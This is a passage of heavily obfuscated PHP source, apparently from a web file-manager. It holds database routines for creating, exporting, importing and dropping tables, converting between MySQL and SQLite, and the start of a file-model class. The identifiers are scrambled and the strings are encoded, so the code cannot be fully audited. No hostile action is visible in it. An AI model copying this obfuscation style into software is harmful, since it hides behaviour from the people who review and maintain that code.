{ } if (!$ÉıÁÂÄÍ) { $İ¢Ìˆ«Ñ->execute("\x63\x72\x65\141\164\145\x20\x64\x61\x74\141\x62\141\163\x65\x20\x60{$öå½Ó³›}\140"); } $Àòœ÷Ô[$ƒ«¾ÆÜÖ[1058]] = $öå½Ó³›; if ($Àòœ÷Ô[$ƒ«¾ÆÜÖ[1053]] == $ƒ«¾ÆÜÖ[1050]) { $Àòœ÷Ô[$ƒ«¾ÆÜÖ[1059]] .= $ƒ«¾ÆÜÖ[1145] . $öå½Ó³›; } $this->database = $Àòœ÷Ô; $İ¢Ìˆ«Ñ->execute("\x75\x73\x65\x20\140{$öå½Ó³›}\x60"); return $İ¢Ìˆ«Ñ; } public function createTable($Œ”Äé™ , &$Äñ¾Åõõ) { $ÔÃÛÄ¡Î =& $_SERVER[¼’ç§¼´]; if (!IO::exist($Œ”Äé™ )) { ActionCall($ÔÃÛÄ¡Î[1146], !0, 0); show_json(LNG($ÔÃÛÄ¡Î[1147]), !1); } $Æ•şÂ¹ó = $this->model()->db(); $èà¨£”Ú = sqlSplit(IO::getContent($Œ”Äé™ )); foreach ($èà¨£”Ú as $ÄŞì¡ãì) { $èıËõ‹‚ = stripos($ÄŞì¡ãì, $ÔÃÛÄ¡Î[1148]) === 0; if ($èıËõ‹‚) { $Äñ¾Åõõ->task[$ÔÃÛÄ¡Î[1149]] += 1; } $Æ•şÂ¹ó->execute($ÄŞì¡ãì); if ($èıËõ‹‚) { preg_match($ÔÃÛÄ¡Î[1150], $ÄŞì¡ãì, $–¶ëÄ£ª); $Äñ¾Åõõ->task[$ÔÃÛÄ¡Î[1151]] = $–¶ëÄ£ª[1]; $Äñ¾Åõõ->update(1); } } } public function insertTable($ÜâÍ¨Ûı, &$Ûú©ªší) { $›ÏŸ Ø =& $_SERVER[¼’ç§¼´]; $áğÊàã£ = $this->model()->db(); $ÛùÜã¨— = $şäÃ™œ ? array($şäÃ™œ) : $áğÊàã£->getTables(); foreach ($ÜâÍ¨Ûı as $‡––’ñÓ) { $şäÃ™œ = basename($‡––’ñÓ, $›ÏŸ Ø[877]); if (!in_array($şäÃ™œ, $ÛùÜã¨—)) { continue; } $Ûú©ªší->task[$›ÏŸ Ø[1151]] = $şäÃ™œ; if (get_filesize($‡––’ñÓ) == 0) { continue; } $ïŸÎ¬—º = $this->sqlToDb($‡––’ñÓ, $Ûú©ªší); if (!$ïŸÎ¬—º) { ActionCall($›ÏŸ Ø[1146], !0, 0); show_json(LNG($›ÏŸ Ø[1152]) . "\x5b{$şäÃ™œ}\x5d", !1); } } } public function sqlFromDb($â›§ÅÊÔ, $šŸ¸±›, &$×²àÒ‘§, $ıÈ¹µº = '') { if ($×²àÒ‘§) { $×²àÒ‘§->task[$_SERVER[¼’ç§¼´][1151]] = $â›§ÅÊÔ; } $¨Ç¯ŞŒº = $this->model($â›§ÅÊÔ); $¿‰§ñ¡´ = 0; $íèŒ¶Äô = 0; $ŒÖÌÅ×ç = 10000; $è¾Ó®¾ = fopen($šŸ¸±›, $_SERVER[¼’ç§¼´][1153]); $Š·Á§¦´ = $¨Ç¯ŞŒº->getPk(); $‘™ÌÀˆå = $¨Ç¯ŞŒº->getDbFields(); $†™£Êçë = $_SERVER[¼’ç§¼´][12]; if ($GLOBALS[$_SERVER[¼’ç§¼´][876]] && in_array($â›§ÅÊÔ, array($_SERVER[¼’ç§¼´][1154], $_SERVER[¼’ç§¼´][1155]))) { $†™£Êçë = $â›§ÅÊÔ; } do { $†İÌè½› = array($Š·Á§¦´ => array($_SERVER[¼’ç§¼´][1100], $íèŒ¶Äô)); $½ğŸÒ² = $¨Ç¯ŞŒº->where($†İÌè½›)->field($‘™ÌÀˆå)->order($Š·Á§¦´ . $_SERVER[¼’ç§¼´][1156])->limit($ŒÖÌÅ×ç)->select(); $½ğŸÒ² = !empty($½ğŸÒ²) ? $½ğŸÒ² : array(); if (!($°ŸÏî™Õ = count($½ğŸÒ²))) { break; } $Èœç ß‹ = end($½ğŸÒ²); $íèŒ¶Äô = $Èœç ß‹[$Š·Á§¦´]; $¬¬ª¤Ô = array(); foreach ($½ğŸÒ² as $˜™ÍçŸş) { if ($†™£Êçë) { if ($â›§ÅÊÔ == $_SERVER[¼’ç§¼´][1154]) { if ($˜™ÍçŸş[$_SERVER[¼’ç§¼´][33]] == $_SERVER[¼’ç§¼´][1157]) { $ü·í¯¹‰ = json_decode($˜™ÍçŸş[$_SERVER[¼’ç§¼´][461]], !0); if ($ü·í¯¹‰[$_SERVER[¼’ç§¼´][32]] == $GLOBALS[$_SERVER[¼’ç§¼´][876]] && $ü·í¯¹‰[$_SERVER[¼’ç§¼´][838]] != 1) { continue; } } } else { if ($˜™ÍçŸş[$_SERVER[¼’ç§¼´][33]] == $_SERVER[¼’ç§¼´][1158] && $˜™ÍçŸş[$_SERVER[¼’ç§¼´][97]] == $_SERVER[¼’ç§¼´][871]) { continue; } } } if ($ıÈ¹µº) { $˜™ÍçŸş[$_SERVER[¼’ç§¼´][87]] = "\173\151\x6f\72{$ıÈ¹µº}\175" . substr($˜™ÍçŸş[$_SERVER[¼’ç§¼´][87]], strlen("\173\151\x6f\x3a{$˜™ÍçŸş[$_SERVER[¼’ç§¼´][906]]}\175")); $˜™ÍçŸş[$_SERVER[¼’ç§¼´][906]] = $ıÈ¹µº; } $¬¬ª¤Ô[] = $_SERVER[¼’ç§¼´][1159] . $this->sqlEncode($˜™ÍçŸş) . $_SERVER[¼’ç§¼´][1160]; } $®’»ıÌ½ = "\x49\116\x53\105\122\x54\40\x49\x4e\x54\117\40\x60{$â›§ÅÊÔ}\140\40\x28\140" . implode($_SERVER[¼’ç§¼´][1161], $‘™ÌÀˆå) . $_SERVER[¼’ç§¼´][1162]; fwrite($è¾Ó®¾, $®’»ıÌ½ . implode($_SERVER[¼’ç§¼´][1163], $¬¬ª¤Ô) . $_SERVER[¼’ç§¼´][74] . PHP_EOL); $¿‰§ñ¡´ += $°ŸÏî™Õ; if ($×²àÒ‘§) { $×²àÒ‘§->update($°ŸÏî™Õ); } } while ($ŒÖÌÅ×ç == $°ŸÏî™Õ); fclose($è¾Ó®¾); return $¿‰§ñ¡´; } public function sqlToDb($ùªàæ, &$‡½Î—Şç) { $Şßà„î =& $_SERVER[¼’ç§¼´]; $ÛÕáê’ = $this->model()->db(); $‰Šüœ´® = @fopen($ùªàæ, $Şßà„î[1164]); if (!$‰Šüœ´®) { return !1; } $«ÔÆşìĞ = 0; $×±¢ãÍ» = $Şßà„î[12]; $èİ‰¸ÈŠ = array(); $¹®È²ğ = $this->dbType(); $–®ÉŞÉ = $¹®È²ğ == $Şßà„î[13] ? 500 : 2000; $Üş©ÊåÍ = basename($ùªàæ, $Şßà„î[877]); $ñ³ùÏ“ = 0; $çÈ÷‰–¿ = 4194304; while (!feof($‰Šüœ´®)) { $™…ÔÂïå = trim(fgets($‰Šüœ´®)); if (!$™…ÔÂïå) { continue; } $›éÀ½Ë = $this->sqlDecode($™…ÔÂïå, $¹®È²ğ, $Üş©ÊåÍ); if (stripos($›éÀ½Ë, $Şßà„î[441]) === 0) { if (!$×±¢ãÍ») { $×±¢ãÍ» = $›éÀ½Ë . $Şßà„î[53]; } continue; } if ($‡½Î—Şç) { $‡½Î—Şç->task[$Şßà„î[1149]] += 1; } $«ÔÆşìĞ++; $èİ‰¸ÈŠ[] = rtrim(rtrim(trim($›éÀ½Ë), $Şßà„î[50]), $Şßà„î[74]); $Áû’Âˆ´ = null; $“æˆòÅó = strlen($›éÀ½Ë); $ñ³ùÏ“ += $“æˆòÅó; $Á’¾õ– = strlen($×±¢ãÍ») + $ñ³ùÏ“ + (count($èİ‰¸ÈŠ) - 1); if ($Á’¾õ– >= $çÈ÷‰–¿) { $Áû’Âˆ´ = array_pop($èİ‰¸ÈŠ); if ($«ÔÆşìĞ > 1) { $«ÔÆşìĞ--; } } if ($«ÔÆşìĞ >= $–®ÉŞÉ || $Áû’Âˆ´) { $›éÀ½Ë = $×±¢ãÍ» . implode($Şßà„î[50], $èİ‰¸ÈŠ); if (!$ÛÕáê’->execute($›éÀ½Ë)) { return !1; } if ($‡½Î—Şç) { $‡½Î—Şç->update($«ÔÆşìĞ); } $èİ‰¸ÈŠ = array(); $«ÔÆşìĞ = 0; $ñ³ùÏ“ = 0; if ($Áû’Âˆ´) { $èİ‰¸ÈŠ = array($Áû’Âˆ´); $«ÔÆşìĞ = 1; $ñ³ùÏ“ = $“æˆòÅó; } } } fclose($‰Šüœ´®); if (!empty($èİ‰¸ÈŠ)) { $›éÀ½Ë = $×±¢ãÍ» . implode($Şßà„î[50], $èİ‰¸ÈŠ); if (!$ÛÕáê’->execute($›éÀ½Ë)) { return !1; } if ($‡½Î—Şç) { $‡½Î—Şç->update($«ÔÆşìĞ); } } return !0; } public function dropTable($»´—Ü’Õ = null) { $¡¸ù£™¥ = $this->model()->db(); $Öñ§›ƒÄ = $»´—Ü’Õ ? array($»´—Ü’Õ) : $¡¸ù£™¥->getTables(); if (!$Öñ§›ƒÄ) { return; } foreach ($Öñ§›ƒÄ as $»´—Ü’Õ) { if ($»´—Ü’Õ) { $»´—Ü’Õ = strtolower($»´—Ü’Õ); } else { continue; } $¡¸ù£™¥->execute("\144\162\157\160\x20\164\141\x62\x6c\x65\x20\x69\x66\x20\145\x78\x69\x73\x74\x73\x20\x60{$»´—Ü’Õ}\140"); } } private function sqlEncode($„Ãüøà½) { $ú²ŠšÕ =& $_SERVER[¼’ç§¼´]; $Ñ™•»„Ğ = array(); foreach ($„Ãüøà½ as $ØÁœ´±›) { if (is_array($ØÁœ´±›)) { $ØÁœ´±› = json_encode_force($ØÁœ´±›); } $ØÁœ´±› = addslashes($ØÁœ´±›); $ØÁœ´±› = str_replace(array($ú²ŠšÕ[1165], $ú²ŠšÕ[287], $ú²ŠšÕ[419]), array($ú²ŠšÕ[1166], $ú²ŠšÕ[1167], $ú²ŠšÕ[1168]), $ØÁœ´±›); $Ñ™•»„Ğ[] = $ØÁœ´±›; } return $ú²ŠšÕ[58] . implode($ú²ŠšÕ[1169], $Ñ™•»„Ğ) . $ú²ŠšÕ[58]; } private function sqlDecode($–¤‹×Ñ™, $É†àãÃ, $£ÉÎÄ€ì = '') { $‡úªö¬¹ =& $_SERVER[¼’ç§¼´]; $–¤‹×Ñ™ = str_replace(array($‡úªö¬¹[1166], $‡úªö¬¹[1167], $‡úªö¬¹[1168]), array($‡úªö¬¹[1165], $‡úªö¬¹[287], $‡úªö¬¹[419]), $–¤‹×Ñ™); if ($É†àãÃ == $‡úªö¬¹[13]) { $–¤‹×Ñ™ = str_ireplace($‡úªö¬¹[1170], $‡úªö¬¹[59], $–¤‹×Ñ™); $–¤‹×Ñ™ = stripslashes($–¤‹×Ñ™); } return preg_replace($‡úªö¬¹[1171], $‡úªö¬¹[12], $–¤‹×Ñ™); if ($É†àãÃ == $‡úªö¬¹[13]) { return $£ÉÎÄ€ì != $‡úªö¬¹[870] ? stripslashes($–¤‹×Ñ™) : $–¤‹×Ñ™; } if ($£ÉÎÄ€ì == $‡úªö¬¹[870]) { $–¤‹×Ñ™ = str_replace($‡úªö¬¹[1172], $‡úªö¬¹[121], stripslashes($–¤‹×Ñ™)); } return $–¤‹×Ñ™; } public function getSqlFile($çï†½¡Å = '') { $ı¤Ò³° =& $_SERVER[¼’ç§¼´]; $³ô çÁÑ = $this->dbType(!0); $½¯íãÏŒ = CONTROLLER_DIR . "\x69\156\163\x74\x61\154\154\x2f\144\141\164\141\x2f{$³ô çÁÑ}\x2e\x73\161\x6c"; $•Şè‘Ó = file_get_contents($½¯íãÏŒ); $ä¿£¯Œã = $ı¤Ò³°[1173] . ($³ô çÁÑ == $ı¤Ò³°[893] ? $ı¤Ò³°[1174] : $ı¤Ò³°[1175]) . $ı¤Ò³°[1176]; preg_match_all($ä¿£¯Œã, $•Şè‘Ó, $¼ÖîÔÚƒ); $ï§”ŸµŞ = $¼ÖîÔÚƒ[1]; $ÑåÑËÛ’ = $this->model()->db(); $®í—Ü = $ÑåÑËÛ’->getTables(); $¶ˆÇÀ”© = TEMP_FILES . $ı¤Ò³°[1177] . date($ı¤Ò³°[261]) . $ı¤Ò³°[8]; del_dir($¶ˆÇÀ”©); mk_dir($¶ˆÇÀ”©); $…êõñ¿ = $¶ˆÇÀ”© . $ı¤Ò³°[1178]; $Õ»ƒ¡¨Â = $¶ˆÇÀ”© . $ı¤Ò³°[1179]; $½›Ÿşê× = $³ô çÁÑ == $ı¤Ò³°[13] ? $ı¤Ò³°[893] : $ı¤Ò³°[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\141\154\x6c\x2f\144\x61\164\x61\57{$½›Ÿşê×}\x2e\x73\161\154", $¶ˆÇÀ”©); @touch($¶ˆÇÀ”© . $³ô çÁÑ . $ı¤Ò³°[877]); $Äò“¬ßÕ = fopen($…êõñ¿, $ı¤Ò³°[1153]); $¨ „ÂŠç = fopen($Õ»ƒ¡¨Â, $ı¤Ò³°[1153]); if ($³ô çÁÑ == $ı¤Ò³°[13]) { $®í—Ü = array_diff($®í—Ü, array($ı¤Ò³°[868], $ı¤Ò³°[869])); $É¼ğ™“Ü = array($ı¤Ò³°[1180], $ı¤Ò³°[1181], $ı¤Ò³°[1182]); fwrite($¨ „ÂŠç, implode(PHP_EOL, $É¼ğ™“Ü) . PHP_EOL . PHP_EOL); foreach ($®í—Ü as $ Œ¥Î•) { $ß©­†Õ = $this->sqlFromSqlite($ Œ¥Î•); if (!$ß©­†Õ[$ı¤Ò³°[13]]) { continue; } fwrite($¨ „ÂŠç, $ß©­†Õ[$ı¤Ò³°[13]] . PHP_EOL . PHP_EOL); if (!in_array($ Œ¥Î•, $ï§”ŸµŞ)) { fwrite($Äò“¬ßÕ, $ß©­†Õ[$ı¤Ò³°[893]] . PHP_EOL . PHP_EOL); } } } else { foreach ($®í—Ü as $ Œ¥Î•) { $ß©­†Õ = $this->sqlFromMysql($ Œ¥Î•); if (!$ß©­†Õ[$ı¤Ò³°[893]]) { continue; } fwrite($Äò“¬ßÕ, $ß©­†Õ[$ı¤Ò³°[893]] . PHP_EOL . PHP_EOL); if (!in_array($ Œ¥Î•, $ï§”ŸµŞ)) { fwrite($¨ „ÂŠç, $ß©­†Õ[$ı¤Ò³°[13]] . PHP_EOL . PHP_EOL); } } } fclose($Äò“¬ßÕ); fclose($¨ „ÂŠç); $•Şè‘Ó = array($ı¤Ò³°[893] => $…êõñ¿, $ı¤Ò³°[13] => $Õ»ƒ¡¨Â); return $çï†½¡Å ? $•Şè‘Ó[$çï†½¡Å] : $•Şè‘Ó; } public function dbType($Ê¬ë®ş³ = false) { $‘êœ“«ò =& $_SERVER[¼’ç§¼´]; $Ë‹ˆ“ñá = $Ê¬ë®ş³ ? $GLOBALS[$‘êœ“«ò[6]][$‘êœ“«ò[21]] : $this->database; $Ë‹ˆ“ñá = array_change_key_case($Ë‹ˆ“ñá); $â û‹ÍÅ = $Ë‹ˆ“ñá[$‘êœ“«ò[1053]]; if ($â û‹ÍÅ == $‘êœ“«ò[1050]) { $Ü“¨…Òº = explode($‘êœ“«ò[4], $Ë‹ˆ“ñá[$‘êœ“«ò[1059]]); $â û‹ÍÅ = $Ü“¨…Òº[0]; } $œöº¦ì• = array($‘êœ“«ò[1183] => $‘êœ“«ò[13], $‘êœ“«ò[998] => $‘êœ“«ò[893]); if (isset($œöº¦ì•[$â û‹ÍÅ])) { $â û‹ÍÅ = $œöº¦ì•[$â û‹ÍÅ]; } return $â û‹ÍÅ; } public function sqlFromMysql($³ÎƒÈÇ‚, $¿‡­ã›¸ = '') { $ã”ñÆÆ– =& $_SERVER[¼’ç§¼´]; $ÜğÑŞßİ = $this->model()->db(); $ÄáÙ¥Ö = $ÜğÑŞßİ->query($ã”ñÆÆ–[1184] . $³ÎƒÈÇ‚ . $ã”ñÆÆ–[472]); if (!$ÄáÙ¥Ö || !$ÄáÙ¥Ö[0]) { return !1; } $¥ãŞ˜Ô÷ = _get($ÄáÙ¥Ö[0], $ã”ñÆÆ–[1185], $ã”ñÆÆ–[12]); if (!$¥ãŞ˜Ô÷) { return !1; } $ØÆŒì¬Õ = "\x44\122\x4f\x50\x20\124\x41\102\x4c\x45\x20\111\106\40\x45\x58\x49\x53\x54\x53\40\140{$³ÎƒÈÇ‚}\140\x3b" . PHP_EOL . $¥ãŞ˜Ô÷ . $ã”ñÆÆ–[74]; if ($¿‡­ã›¸ && $¿‡­ã›¸ == $ã”ñÆÆ–[893]) { return $ØÆŒì¬Õ; } $µßøËºá = array_change_key_case($GLOBALS[$ã”ñÆÆ–[6]][$ã”ñÆÆ–[21]]); $¡Ò€› ¦ = $µßøËºá[$ã”ñÆÆ–[1058]]; $ÛÕÁŸŠ = $ã”ñÆÆ–[1186] . $¡Ò€› ¦ . $ã”ñÆÆ–[1187] . $³ÎƒÈÇ‚ . $ã”ñÆÆ–[58]; $ É¢Ûà = $ã”ñÆÆ–[1188] . $³ÎƒÈÇ‚ . $ã”ñÆÆ–[986]; $§¿°Ìó = $ÜğÑŞßİ->query($ÛÕÁŸŠ); if (empty($§¿°Ìó)) { $Æ±¸Ô¶Æ = array($ã”ñÆÆ–[893] => $ã”ñÆÆ–[12], $ã”ñÆÆ–[13] => $ã”ñÆÆ–[12]); return $¿‡­ã›¸ ? $Æ±¸Ô¶Æ[$¿‡­ã›¸] : $Æ±¸Ô¶Æ; } $ıòºÖÆá = $ÜğÑŞßİ->query($ É¢Ûà); $³«±ç = $ã”ñÆÆ–[12]; $ÑÒø¤Ä¿ = array(); foreach ($ıòºÖÆá as $•Æäïö€) { if (!$³«±ç && $•Æäïö€[$ã”ñÆÆ–[1189]] == $ã”ñÆÆ–[1190]) { $³«±ç = $•Æäïö€[$ã”ñÆÆ–[1191]]; } if (isset($ÑÒø¤Ä¿[$•Æäïö€[$ã”ñÆÆ–[1189]]])) { $ÑÒø¤Ä¿[$•Æäïö€[$ã”ñÆÆ–[1189]]][$ã”ñÆÆ–[1192]][] = $•Æäïö€[$ã”ñÆÆ–[1191]]; continue; } $ÑÒø¤Ä¿[$•Æäïö€[$ã”ñÆÆ–[1189]]] = array($ã”ñÆÆ–[1193] => $•Æäïö€[$ã”ñÆÆ–[1189]], $ã”ñÆÆ–[1192] => array($•Æäïö€[$ã”ñÆÆ–[1191]]), $ã”ñÆÆ–[1194] => $•Æäïö€[$ã”ñÆÆ–[1195]] == $ã”ñÆÆ–[91] ? 0 : 1); } $¾¿«Š¶« = array(); foreach ($ÑÒø¤Ä¿ as $•Æäïö€) { $ÚŸ ¥© = $•Æäïö€[$ã”ñÆÆ–[1193]] == $ã”ñÆÆ–[1190]; $î¬·ù¾ = array($ã”ñÆÆ–[1196], $•Æäïö€[$ã”ñÆÆ–[1194]] == $ã”ñÆÆ–[91] && !$ÚŸ ¥© ? $ã”ñÆÆ–[1197] : $ã”ñÆÆ–[12], $ã”ñÆÆ–[1198], $ã”ñÆÆ–[1199] . $³ÎƒÈÇ‚ . $ã”ñÆÆ–[11] . ($ÚŸ ¥© ? $ã”ñÆÆ–[1200] : $•Æäïö€[$ã”ñÆÆ–[1193]]) . $ã”ñÆÆ–[121], $ã”ñÆÆ–[1201], $ã”ñÆÆ–[121] . $³ÎƒÈÇ‚ . $ã”ñÆÆ–[121], $ã”ñÆÆ–[1202] . implode($ã”ñÆÆ–[1203], $•Æäïö€[$ã”ñÆÆ–[1192]]) . $ã”ñÆÆ–[1204]); $¾¿«Š¶«[] = implode($ã”ñÆÆ–[53], $î¬·ù¾) . $ã”ñÆÆ–[74]; } $ï—°€õÁ = array(); $Ù¾¶åò¸ = array($ã”ñÆÆ–[1205] => $ã”ñÆÆ–[1206], $ã”ñÆÆ–[1206] => $ã”ñÆÆ–[1206], $ã”ñÆÆ–[365] => $ã”ñÆÆ–[392], $ã”ñÆÆ–[364] => $ã”ñÆÆ–[392]); foreach ($§¿°Ìó as $•Æäïö€) { $î¬·ù¾ = array($ã”ñÆÆ–[121] . $•Æäïö€[$ã”ñÆÆ–[1207]] . $ã”ñÆÆ–[121], isset($Ù¾¶åò¸[$•Æäïö€[$ã”ñÆÆ–[1208]]]) ? $Ù¾¶åò¸[$•Æäïö€[$ã”ñÆÆ–[1208]]] : $•Æäïö€[$ã”ñÆÆ–[1209]], $•Æäïö€[$ã”ñÆÆ–[1210]] == $ã”ñÆÆ–[984] ? $ã”ñÆÆ–[1211] : $ã”ñÆÆ–[1212], $•Æäïö€[$ã”ñÆÆ–[1207]] == $³«±ç ? $ã”ñÆÆ–[1213] : $ã”ñÆÆ–[12], $•Æäïö€[$ã”ñÆÆ–[1035]] ? strtoupper(str_replace($ã”ñÆÆ–[11], $ã”ñÆÆ–[12], $•Æäïö€[$ã”ñÆÆ–[1035]])) : $ã”ñÆÆ–[12]); $ï—°€õÁ[] = trim(implode($ã”ñÆÆ–[53], $î¬·ù¾)); } $ÆÒ“¨óç = array($ã”ñÆÆ–[1214] . $³ÎƒÈÇ‚ . $ã”ñÆÆ–[1215], $ã”ñÆÆ–[1216] . $³ÎƒÈÇ‚ . $ã”ñÆÆ–[1217], implode($ã”ñÆÆ–[50] . PHP_EOL, $ï—°€õÁ), $ã”ñÆÆ–[1032]); $¶»€»²€ = implode(PHP_EOL, array_merge($ÆÒ“¨óç, $¾¿«Š¶«)); if ($¿‡­ã›¸ && $¿‡­ã›¸ == $ã”ñÆÆ–[13]) { return $¶»€»²€; } $Æ±¸Ô¶Æ = array($ã”ñÆÆ–[893] => $ØÆŒì¬Õ, $ã”ñÆÆ–[13] => $¶»€»²€); return $¿‡­ã›¸ ? $Æ±¸Ô¶Æ[$¿‡­ã›¸] : $Æ±¸Ô¶Æ; } public function sqlFromSqlite($æã“Ë¡˜, $ïçÖùš = '') { $ò –ßÓÎ =& $_SERVER[¼’ç§¼´]; $³‘ÄµØô = $this->model()->db(); $òäƒ­²Ì = "\x50\122\x41\107\x4d\x41\x20\124\x41\x42\114\x45\137\111\x4e\x46\x4f\40\50\x27{$æã“Ë¡˜}\x27\51"; $èä×ãÆı = "\x53\105\x4c\x45\103\124\x20\52\x20\x46\122\117\115\x20\163\x71\x6c\x69\x74\145\137\x6d\x61\x73\x74\x65\162\40\x57\110\x45\x52\x45\40\x74\x62\154\137\x6e\x61\155\145\40\x3d\40\x27{$æã“Ë¡˜}\x27"; $çóÈ¬¾Ş = $³‘ÄµØô->query($òäƒ­²Ì); if (empty($çóÈ¬¾Ş)) { $öĞËŸŠĞ = array($ò –ßÓÎ[893] => $ò –ßÓÎ[12], $ò –ßÓÎ[13] => $ò –ßÓÎ[12]); return $ïçÖùš ? $öĞËŸŠĞ[$ïçÖùš] : $öĞËŸŠĞ; } $§™¸«ş = $³‘ÄµØô->query($èä×ãÆı); $æğ€Šœî = $ƒŠ÷«ƒ = array(); foreach ($§™¸«ş as $Ş•êõü¤) { if ($Ş•êõü¤[$ò –ßÓÎ[33]] == $ò –ßÓÎ[358]) { $æğ€Šœî[] = $Ş•êõü¤[$ò –ßÓÎ[1218]]; } else { $ƒŠ÷«ƒ[$Ş•êõü¤[$ò –ßÓÎ[32]]] = $Ş•êõü¤[$ò –ßÓÎ[1218]]; } } $šŒĞô«¨ = array_merge(array($ò –ßÓÎ[1214] . $æã“Ë¡˜ . $ò –ßÓÎ[121]), $æğ€Šœî, array_values($ƒŠ÷«ƒ)); $šŒĞô«¨ = implode($ò –ßÓÎ[74] . PHP_EOL, $šŒĞô«¨) . $ò –ßÓÎ[74]; if ($ïçÖùš && $ïçÖùš == $ò –ßÓÎ[13]) { return $šŒĞô«¨; } $ûñÊä‘ = array(); foreach ($ƒŠ÷«ƒ as $•á©Ìâ => $¹’óÕâ) { $ú­¾ñÂØ = str_replace($ò –ßÓÎ[1219] . $æã“Ë¡˜ . $ò –ßÓÎ[11], $ò –ßÓÎ[12], $•á©Ìâ); $ú­¾ñÂØ = str_replace($æã“Ë¡˜ . $ò –ßÓÎ[11], $ò –ßÓÎ[12], $•á©Ìâ); $Øéí”´Á = str_replace(array($ò –ßÓÎ[121], $ò –ßÓÎ[1043]), $ò –ßÓÎ[472], substr($¹’óÕâ, stripos($¹’óÕâ, $ò –ßÓÎ[339]))); $ûñÊä‘[$ú­¾ñÂØ] = $Øéí”´Á; } $×œ§¬Ò² = array(); $ùÌÎò´ = array($ò –ßÓÎ[1206] => $ò –ßÓÎ[1220], $ò –ßÓÎ[392] => $ò –ßÓÎ[1221]); $Ó²“»‘ = $¤Üì“§ = $ò –ßÓÎ[12]; foreach ($çóÈ¬¾Ş as $Ş•êõü¤) { if ($Ş•êõü¤[$ò –ßÓÎ[57]] == $ò –ßÓÎ[91]) { $Ó²“»‘ = $Ş•êõü¤[$ò –ßÓÎ[32]]; } $†ö¤˜¡» = $Ş•êõü¤[$ò –ßÓÎ[33]]; if ($†ö¤˜¡» == $ò –ßÓÎ[1222] && isset($ûñÊä‘[$Ş•êõü¤[$ò –ßÓÎ[32]]])) { $†ö¤˜¡» = $ò –ßÓÎ[1223]; } $ıïùïÕ’ = array($ò –ßÓÎ[472] . $Ş•êõü¤[$ò –ßÓÎ[32]] . $ò –ßÓÎ[472], _get($ùÌÎò´, $†ö¤˜¡», $†ö¤˜¡»), $Ş•êõü¤[$ò –ßÓÎ[35]] == $ò –ßÓÎ[91] ? $ò –ßÓÎ[1211] : $ò –ßÓÎ[1224] . $Ş•êõü¤[$ò –ßÓÎ[56]], $Ş•êõü¤[$ò –ßÓÎ[57]] == $ò –ßÓÎ[91] ? $ò –ßÓÎ[1225] : $ò –ßÓÎ[12]); $×œ§¬Ò²[] = trim(implode($ò –ßÓÎ[53], $ıïùïÕ’)); } foreach ($ûñÊä‘ as $ú­¾ñÂØ => $Øéí”´Á) { if ($ú­¾ñÂØ == $ò –ßÓÎ[1200]) { $ˆÃôßñ¨ = $¤Üì“§ = $ò –ßÓÎ[1226] . $Ó²“»‘ . $ò –ßÓÎ[1227]; } else { $ˆÃôßñ¨ = (stripos($ú­¾ñÂØ, $ò –ßÓÎ[11]) ? $ò –ßÓÎ[1228] : $ò –ßÓÎ[12]) . ($ò –ßÓÎ[1229] . $ú­¾ñÂØ . $ò –ßÓÎ[1230] . $Øéí”´Á); } $×œ§¬Ò²[] = $ˆÃôßñ¨; } if ($Ó²“»‘ && !$¤Üì“§) { $×œ§¬Ò² = array_merge(array($ò –ßÓÎ[1226] . $Ó²“»‘ . $ò –ßÓÎ[1227]), $×œ§¬Ò²); } $¬„Ãƒû‹ = array($ò –ßÓÎ[1231] . $æã“Ë¡˜ . $ò –ßÓÎ[1232], $ò –ßÓÎ[1233] . $æã“Ë¡˜ . $ò –ßÓÎ[1234], implode($ò –ßÓÎ[50] . PHP_EOL, $×œ§¬Ò²), $ò –ßÓÎ[1235]); $È¥ß„ƒõ = implode(PHP_EOL, $¬„Ãƒû‹); if ($ïçÖùš && $ïçÖùš == $ò –ßÓÎ[893]) { return $È¥ß„ƒõ; } $öĞËŸŠĞ = array($ò –ßÓÎ[893] => $È¥ß„ƒõ, $ò –ßÓÎ[13] => $šŒĞô«¨); return $ïçÖùš ? $öĞËŸŠĞ[$ïçÖùš] : $öĞËŸŠĞ; } } goto CªŒÁ‡¯§±; d‰ÌÜø¼Î: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\x6c\145"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\x6d\x65" => "\x69\x6f\x5f\x66\x69\154\x65\137\155\145\164\141", "\155\x65\164\x61\x46\x69\145\x6c\x64" => "\x66\x69\x6c\x65\111\104"); public function fileInfo($Ö¿ç­šğ) { $ÅŸø©Œ¸ =& $_SERVER[¼’ç§¼´]; static $ÒôÄ…— = array(); if (!isset($ÒôÄ…—[$Ö¿ç­šğ])) { $Š“Ç€ü¬ = $ÅŸø©Œ¸[2034]; $³’‘›Áå = Model($ÅŸø©Œ¸[555])->field($Š“Ç€ü¬)->where(array($ÅŸø©Œ¸[553] => $Ö¿ç­šğ))->find(); $ÒôÄ…—[$Ö¿ç­šğ] = $³’‘›Áå; } return $ÒôÄ…—[$Ö¿ç­šğ]; } public function addFileByContent($åÑÚšÂª = '', $±‘ßÀíà = '') { $¿àÈ€ô =& $_SERVER[¼’ç§¼´]; $””†º‰ = TEMP_PATH . $¿àÈ€ô[2035]; if (!is_dir($””†º‰)) { mk_dir($””†º‰); } $ì—¨¨şÔ = $””†º‰ . $¿àÈ€ô[2036] . rand_string(16); file_put_contents($ì—¨¨şÔ, $åÑÚšÂª); $µŸü¶×ã = $this->addFile($ì—¨¨şÔ, $±‘ßÀíà, !0); if (file_exists($ì—¨¨şÔ)) { @unlink($ì—¨¨şÔ); } return $µŸü¶×ã; } public function createFileName($¤ÎŞ·í„, $×’‚à“  = false, $ò•êı = false) { $øô…¥õ‘ =& $_SERVER[¼’ç§¼´]; $ÅÄæ‡œ— = IO::init($øô…¥õ‘[8]); $ğ¿êÛñ» = $this->makeFilePath($¤ÎŞ·í„, $ÅÄæ‡œ—, $×’‚à“ , $ò•êı); $”Öü³áÖ = $ÅÄæ‡œ—->pathFather($ğ¿êÛñ»); static $ÀáÏÛœÅ = false; $¬ò‰ì¾Û = $øô…¥õ‘[2037] . md5($”Öü³áÖ); if (!$ÀáÏÛœÅ && !Cache::get($¬ò‰ì¾Û)) { $ÀáÏÛœÅ = !0; $Å”¼¨ÀÜ = IO::mkdir($”Öü³áÖ); if (!IO::exist($Å”¼¨ÀÜ . $øô…¥õ‘[886])) { IO::mkfile($Å”¼¨ÀÜ . $øô…¥õ‘[886]); } Cache::set($¬ò‰ì¾Û, 1, 3600 * 2); } return $ğ¿êÛñ»; } public function makeFilePath($—¸¯Œ°¢, $Îª—¡¤, 